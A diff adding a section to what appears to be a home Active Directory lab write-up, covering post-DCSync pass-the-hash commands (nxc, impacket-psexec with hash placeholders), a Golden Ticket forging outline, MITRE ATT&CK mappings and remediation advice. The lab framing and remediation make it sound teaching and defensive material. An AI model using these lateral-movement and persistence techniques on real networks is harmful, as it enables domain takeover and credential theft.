@@ -211,3 +211,33 @@ rockyou — only the deliberately-weak seeded passwords fall, exactly as designe
 > git-ignored `marvel-loot/` directory on the attacker box — not in version control. The seeded
 > user passwords shown above are already public by design, so they're safe to document.
 
+### Post-DCSync: persistence & lateral movement
+
+Once the NTDS secrets are out, the dump enables the standard follow-on techniques. Commands use
+**placeholders** — fill them from your local, git-ignored loot file, never from this repo.
+
+```bash
+# Pass-the-Hash as RID-500 / tstark (Domain Admin) — no password needed (T1550.002):
+nxc smb 10.0.2.10 -u tstark -H <tstark_nt_hash>
+impacket-psexec -hashes :<azureadmin_nt_hash> azureadmin@10.0.2.10   # SYSTEM on the DC
+
+# Golden Ticket for domain persistence, forged from the krbtgt key (T1558.001):
+#   use <krbtgt_nt_hash> (or its AES256 key) with the domain SID -> ticketer.py / Rubeus
+```
+
+| Stage | MITRE ATT&CK |
+|---|---|
+| DCSync via SQL_Service | **T1003.006** — OS Credential Dumping: DCSync |
+| Pass-the-Hash (azureadmin / tstark) | **T1550.002** — Use Alternate Auth Material: PtH |
+| Golden Ticket (krbtgt) | **T1558.001** — Steal/Forge Kerberos Tickets: Golden Ticket |
+
+**Remediation (the real-world fixes these map to):** least-privilege service accounts with **no
+Domain Admin** and **gMSAs** instead of static passwords; **AES-only** Kerberos (no RC4); tiered
+admin / Protected Users so DA hashes never cache on workstations; and — after any DC compromise —
+a **double krbtgt reset** to invalidate forged Golden Tickets.
+
+> **Note for this lab:** because the real `krbtgt` and `azureadmin` secrets have now appeared in
+> screenshots and pasted text, they should be considered disclosed. That's harmless for a
+> throwaway practice lab, but if you ever want it clean again, a fresh `./destroy-azure.sh &&
+> ./deploy-azure.sh` rotates every one of them.
+
